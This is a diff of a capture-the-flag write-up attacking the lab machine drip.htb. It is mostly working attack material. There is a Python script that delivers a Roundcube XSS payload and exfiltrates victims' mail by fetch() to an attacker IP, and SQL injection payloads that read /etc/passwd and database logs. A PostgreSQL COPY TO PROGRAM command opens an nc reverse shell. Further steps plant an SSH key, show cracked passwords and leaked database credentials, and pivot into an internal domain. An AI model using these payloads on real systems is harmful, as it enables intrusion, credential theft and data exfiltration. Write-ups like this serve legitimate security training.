@@ -71,63 +71,46 @@ And there is an article `https://www.sonarsource.com/blog/government-emails-at-r
 
 Let's take a script from the guys from a well-known forum and modify it a little:
 ```
-import argparse
+import requests
+from http.server import BaseHTTPRequestHandler, HTTPServer
 import base64
 import threading
-import time
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import requests
 from lxml import html
 
-# Argument parser setup
-parser = argparse.ArgumentParser()
-parser.add_argument("-m", "--message", required=True, type=int, help="Message number")
-parser.add_argument("-i", "--ip", required=True, help="Our HTTP Server IP")
-parser.add_argument("-p", "--port", type=int, required=True, help="Our HTTP Server PORT")
-args = parser.parse_args()
-
-LISTEN_IP = args.ip
-LISTEN_PORT = args.port
-MESSAGE_NUMBER = args.message
 
 # Configuration
-TARGET_URL = "http://drip.htb/contact"
-PLACEHOLDER = f"{LISTEN_IP}:{LISTEN_PORT}"
+TARGET_URL = 'http://drip.htb/contact'
+LISTEN_PORT = 8000
+LISTEN_IP = '0.0.0.0'
 
 # Payload for the POST request
-start_msg = (
-    "<body title=\"bgcolor=foo\" name=\"bar style=animation-name:progressbar-stripes "
-    "onanimationstart=fetch('/?_task=mail&_action=show&_uid="
-)
-end_msg = (
-    "&_mbox=INBOX&_extwin=1').then(r => r.text()).then(t => "
-    f"fetch(`http://{PLACEHOLDER}/c=${{btoa(t)}}`)) foo=bar">Foo body></body>"
-)
+start_mesg = '<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid='
+message = 3
+end_mesg = '&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.16.10:8000/c=${btoa(t)}`)) foo=bar">Foo</body>'
 
 post_data = {
-    "name": "root",
-    "email": "root@drip.htb",
-    "message": f"{start_msg}{MESSAGE_NUMBER}{end_msg}",
-    "content": "html",
-    "recipient": "bcase@drip.htb",
+    'name': 'root',
+    'email': 'root@drip.htb',
+    'message': f"{start_mesg}{message}{end_mesg}",
+    'content': 'html',
+    'recipient': 'bcase@drip.htb'
 }
+print(f"{start_mesg}{message}{end_mesg}")
 
+# Headers for the POST request
 headers = {
-    "Host": "drip.htb",
-    "Cache-Control": "max-age=0",
-    "Upgrade-Insecure-Requests": "1",
-    "Origin": "http://drip.htb",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                  "AppleWebKit/537.36 (KHTML, like Gecko) "
-                  "Chrome/123.0.6312.122 Safari/537.36",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp," 
-               "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "Referer": "http://drip.htb/index",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "en-US,en;q=0.9",
-    "Cookie": "session=eyJfZnJlc2giOmZhbHNlfQ.Z6fOBw.u9iWIiki2cUK55mmcizrzU5EJzE",
-    "Connection": "close",
+    'Host': 'drip.htb',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'Origin': 'http://drip.htb',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Referer': 'http://drip.htb/index',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Cookie': 'session=eyJfZnJlc2giOmZhbHNlfQ.Z6fOBw.u9iWIiki2cUK55mmcizrzU5EJzE',
+    'Connection': 'close'
 }
 
 # Function to send the POST request
@@ -141,19 +124,24 @@ class RequestHandler(BaseHTTPRequestHandler):
         if '/c=' in self.path:
             encoded_data = self.path.split('/c=')[1]
             decoded_data = base64.b64decode(encoded_data).decode('latin-1')
-            
+            print(f"[+] Received data {decoded_data}")
             tree = html.fromstring(decoded_data)
+
+            # XPath query to find the div with id 'messagebody'
             message_body = tree.xpath('//div[@id="messagebody"]')
-            
+           
+            # Check if the div exists and extract the content
             if message_body:
+                # Extract inner text, preserving line breaks
                 message_text = message_body[0].text_content().strip()
                 print("[+] Extracted Message Body Content:\n")
                 print(message_text)
             else:
                 print("[!] No div with id 'messagebody' found.")
+
         else:
             print("[!] Received request but no data found.")
-        
+
         self.send_response(200)
         self.end_headers()
         self.wfile.write(b'OK')
@@ -165,11 +153,12 @@ class RequestHandler(BaseHTTPRequestHandler):
 def start_server():
     server_address = (LISTEN_IP, LISTEN_PORT)
     httpd = HTTPServer(server_address, RequestHandler)
-    print(f"[+] Listening on {LISTEN_IP}:{LISTEN_PORT} for exfiltrated data")
+    print(f"[+] Listening on port {LISTEN_PORT} for exfiltrated data...")
     httpd.serve_forever()
 
 # Run the HTTP server in a separate thread
-server_thread = threading.Thread(target=start_server, daemon=True)
+server_thread = threading.Thread(target=start_server)
+server_thread.daemon = True
 server_thread.start()
 
 # Send the POST request
@@ -178,8 +167,276 @@ send_post()
 # Keep the main thread alive to continue listening
 try:
     while True:
-        time.sleep(1)
+        pass
 except KeyboardInterrupt:
     print("\n[+] Stopping server.")
+```
+Firstly, we can check the uid 3 message:
+```
+Hey Bryce,
+
+The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
+
+You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
+
+If you encounter any issues or have feedback, let me know so I can address them promptly.
+```
+Then we can get the other sub-domain here `dev-a3f1-01.drip.htb` and we can access to forget password page, we need to submit the target email
+![](images/Pasted%20image%2020250310113003.png)
+Then continue use the exploit script to get the message
+```
+[+] Extracted Message Body Content:
+
+Your reset token has generated.  Please reset your password within the next 5 minutes.
+
+You may reset your password here: http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z843cA.CLsWMVfy8rPH4MbwMtEytJJ0j_8
+
 
 ```
+![](images/Pasted%20image%2020250310115154.png)
+Then we can get into account of `bcase@drip.htb`
+![](images/Pasted%20image%2020250310115427.png)
+There is a obvious sql-injection here when I search `5001'`
+![](images/Pasted%20image%2020250310124457.png)
+
+Let's read the /etc/hosts file with the payload `''; SELECT pg_read_file('/etc/hosts', 0, 2000);`
+![](images/Pasted%20image%2020250310124638.png)
+```
+127.0.0.1	localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
+172.16.20.3 drip.darkcorp.htb
+```
+
+Then continue to check `/etc/passwd` with the payload `''; SELECT pg_read_file('/etc/passwd', 0, 2000);`
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
+postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+postfix:x:103:111::/var/spool/postfix:/usr/sbin/nologin
+dovecot:x:104:113:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
+dovenull:x:105:114:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
+vmail:x:5000:5000::/home/vmail:/usr/bin/nologin
+avahi:x:106:115:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
+ntpsec:x:107:116::/nonexistent:/usr/sbin/nologin
+sssd:x:108:117:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+_chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
+```
+Continue to check the databases `''; SELECT datname FROM pg_database;`
+```
+|   |   |   |   |   |
+|---|---|---|---|---|
+|postgres|||||
+|template1|||||
+|template0|||||
+|roundcube|||||
+|dripmail|
+```
+
+Then check the tables `''; SELECT tablename FROM pg_tables;`
+![](images/Pasted%20image%2020250310125006.png)
+
+Let's get the password hashes: `''; (SELECT password FROM "Users") `
+```
+|   |   |   |   |   |
+|---|---|---|---|---|
+|d9b9ecbf29db8054b21f303072b37c4e|||||
+|1eace53df87b9a15a37fdc11da2d298d|||||
+|0cebd84e066fd988e89083879e88c5f9|||||
+|63a9f0ea7bb98050796b649e85481845|
+```
+And there is admin hash `''; (SELECT password FROM "Admins") `
+```
+e10adc3949ba59abbe56e057f20f883e
+```
+Not a single hash can be brute-forced.
+Let's try to look at the database logs. To do this, first determine the version:
+`''; SELECT version();`
+```
+PostgreSQL 15.10 (Debian 15.10-0+deb12u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit
+```
+
+Now you can try to read the log:
+`''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log', 0,
+10000000);`
+In this log file, there is nothing interesting here.
+
+Let's check the old version of log files
+`''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0,
+10000000);`
+![](images/Pasted%20image%2020250310125902.png)
+Then we can get the hash of user `ebelford`
+`8bbd7f88841b4223ae63c8848969be86`
+From the crackstation, we can get the cracked hash `8bbd7f88841b4223ae63c8848969be86:ThePlague61780`
+
+Let's use ssh to connect it and then we can handle the shell as `ebelford`
+
+In the /var/backups directory we find backups from postgres from the database user:
+```
+$ ls -la /var/backups | grep postgres
+drwx------ 2 postgres postgres 4096 Feb 5 1252 postgres
+```
+
+Let's try to switch into `postgres` user
+I can get something useful from `/var/www/html/dashboard/.env`
+```
+ebelford@drip:/var/www/html/dashboard$ cat .env
+# True for development, False for production
+DEBUG=False
+
+# Flask ENV
+FLASK_APP=run.py
+FLASK_ENV=development
+
+# If not provided, a random one is generated 
+# SECRET_KEY=<YOUR_SUPER_KEY_HERE>
+
+# Used for CDN (in production)
+# No Slash at the end
+ASSETS_ROOT=/static/assets
+
+# If DB credentials (if NOT provided, or wrong values SQLite is used) 
+DB_ENGINE=postgresql
+DB_HOST=localhost
+DB_NAME=dripmail
+DB_USERNAME=dripmail_dba
+DB_PASS=2Qa2SsBkQvsc
+DB_PORT=5432
+
+SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
+SQLALCHEMY_TRACK_MODIFICATIONS = True
+SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
+MAIL_SERVER = 'drip.htb'
+MAIL_PORT = 25
+MAIL_USE_TLS = False
+MAIL_USE_SSL = False
+MAIL_USERNAME = None
+MAIL_PASSWORD = None
+MAIL_DEFAULT_SENDER = 'support@drip.htb'
+```
+
+Let's get the shell from this user:
+```
+COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.10 4242 >/tmp/f';
+
+# on your car
+$ rlwrap nc -lnvp 4242
+# on the attacked machine
+$ PGPASSWORD=2Qa2SsBkQvsc psql -h localhost -U dripmail_dba -d dripmail
+psql> COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat
+/tmp/f|bash -i 2>&1|nc 10.10.16.3 4242 >/tmp/f';
+# in the terminal as user postgres
+$ mkdir -p ~/.ssh echo "ssh-ed25519
+AAAAC3NzaC1lZDI1NTE5AAAAIGPqkrmvSthuwL/gpIhNJ7ioSieOV53BZH4bMDKalyMF
+kiberdruzhinnik@vm" > ~/.ssh/authorized_keys
+# back on your machine
+$ ssh postgres@drip.htb
+```
+
+Then we can check the backup files.
+```
+postgres@drip:/var/backups/postgres$ ls -al
+total 12
+drwx------ 2 postgres postgres 4096 Feb  5 12:52 .
+drwxr-xr-x 3 root     root     4096 Feb 11 08:10 ..
+-rw-r--r-- 1 postgres postgres 1784 Feb  5 12:52 dev-dripmail.old.sql.gpg
+```
+Let's try to decrypt the old backup using the database password:
+```
+gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > /var/backups/postgres/dev-dripmail.old.sql
+
+```
+And let's look inside:
+```
+$ cat /var/backups/postgres/dev-dripmail.old.sql
+
+COPY public."Admins" (id, username, password, email) FROM stdin;
+1 bcase dc5484871bc95c4eab58032884be7225 bcase@drip.htb
+2 victor.r cac1c7b0e7008d67b6db40c03e76b9c0 victor.r@drip.htb
+3 ebelford 8bbd7f88841b4223ae63c8848969be86 ebelford@drip.htb
+```
+
+Then we can crack these hashes `victor.r:victor1gustavo@#`
+
+Remember we get before `/etc/hosts`
+```
+127.0.0.1       localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
+172.16.20.3 drip.darkcorp.htb
+```
+
+We need to port forwarding into our local machine.
+Let's use sshuttle for forwarding:
+Don't forget to add to /etc/hosts :
+`172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb`
+`172.16.20.3 drip.darkcorp.htb`
+
+```
+sshuttle -r ebelford:'ThePlague61780'@drip.htb -N 172.16.20.0/24
+```
+
+PS: SSHuttle forwards only TCP traffic by default
+sshuttle is mainly used to tunnel TCP traffic, and ICMP (the protocol used by the ping command) is not forwarded by default. Therefore, even if the tunnel is successfully established, the ping command may not be able to detect the connectivity of the target host through the tunnel.
+
+
+Just in case, let's ping 172.16.20.2 :
+```
+$ ping 172.16.20.2
+PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
+64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=2557 ms
+64 bytes from 172.16.20.2: icmp_seq=2 ttl=64 time=1620 ms
+64 bytes from 172.16.20.2: icmp_seq=3 ttl=64 time=606 ms
+```
+And by `nmap`, we can check the valid port and services:
+```
+nmap -sCTV -Pn -vvv 172.16.20.2
+80
+5000
+```
+Port 80
+![](images/Pasted%20image%2020250312005548.png)
+Port 80, we can use the credentials of victor to login
+![](images/Pasted%20image%2020250312005811.png)
+
+Let's partially use proxychains4 and dump the domain for Bloodhound:
+```
+$ sshpass -p'ThePlague61780' ssh -o StrictHostKeyChecking=no -D 1080
+ebelford@drip.htb
+$ sudo apt install proxychains4
+$ sudo nano /etc/proxychains4.conf
+```
+
